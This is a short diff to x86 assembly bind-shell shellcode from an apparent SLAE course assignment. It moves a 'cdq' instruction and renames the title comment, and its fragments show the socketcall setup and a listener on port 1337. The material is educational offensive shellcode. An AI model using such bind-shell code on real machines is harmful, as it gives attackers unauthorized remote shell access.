@@ -1,5 +1,5 @@
 ;
-; SLAE Assignment 1: shell_bind_tcp_nonull
+; SLAE Assignment 1: Shell_Bind_TCP NoNull
 ; Tim Ip (SLAE-1017)
 ;
 
@@ -24,6 +24,7 @@ _start:
 
 	push byte 0x66		; EAX=socketcall=0x66
 	pop eax
+	cdq
 	int 0x80
 	xchg esi, eax		; move sockfd to esi
 
@@ -33,7 +34,6 @@ _start:
 	; *addr={sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("0.0.0.0")}
 	;
 
-	cdq
 	push edx		; addr.sin_addr=INADDR_ANY=0
 	push word 0x3905	; addr.sin_port=1337 big endian
 	inc ebx	
